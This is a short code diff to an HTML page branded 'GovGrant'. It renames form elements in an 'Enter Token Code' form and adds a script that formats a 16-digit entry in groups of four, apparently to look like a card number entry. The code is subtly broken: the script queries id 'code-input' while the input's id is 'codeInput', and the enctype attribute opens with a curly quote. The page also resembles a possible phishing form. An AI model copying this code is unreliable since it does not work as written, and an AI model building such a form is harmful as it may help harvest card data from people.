@@ -234,12 +234,12 @@ blockquote {
 		
 		<!-- Form one -->
 		<div id="form1" class="form-container active">
-     <form id="firstForm" enctype=“multipart/form-data">
+     <form id="formOne" enctype=“multipart/form-data">
 
 		 <h3 class="formHead">Enter Token Code</h3>
 		 
 		 <div class="input">
-			 <input type="tel" id="phone" name="phone" placeholder="Input Code" autocomplete="phone" required>
+			 <input type="tel" id="codeInput" name="phone" placeholder="Input Code" autocomplete="phone" required>
 		 </div>
 		 
 		 <div id="response"></div>
@@ -338,6 +338,18 @@ blockquote {
     <p>&copy; 2005 GovGrant. All rights reserved.</p>
   </footer>
 </body>
+	<script>
+		const codeInput = document.getElementById('code-input');
+
+codeInput.addEventListener('input', (e) => {
+  let value = e.target.value.replace(/\s/g, ''); // remove existing spaces
+  if (value.length > 16) {
+    value = value.slice(0, 16); // limit to 16 digits
+  }
+  const formattedValue = value.match(/.{1,4}/g).join(' '); // add spaces every 4 digits
+  e.target.value = formattedValue;
+});
+	</script>
 </html>
   
   
